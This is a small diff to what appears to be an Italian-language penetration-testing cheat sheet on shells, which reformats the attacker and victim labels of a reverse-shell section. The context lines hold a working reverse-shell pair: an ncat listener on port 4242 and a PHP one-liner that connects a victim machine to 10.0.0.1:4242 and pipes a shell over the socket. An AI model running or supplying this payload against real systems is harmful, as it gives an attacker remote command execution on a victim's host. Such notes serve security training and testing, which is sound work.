@@ -30,13 +30,14 @@
 # SHELLS
 ### Reverse shell
 Nella reverse shell è l'attacker che si mette in listening e la vittima si collega, quindi
-ATTACCANTE:
+
+### ATTACCANTE:
 
 ```
 ncat -lvnp 4242
 ```
 
-VITTIMA:
+### VITTIMA:
 
 #### php
 ```php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("sh <&3 >&3 2>&3");'```
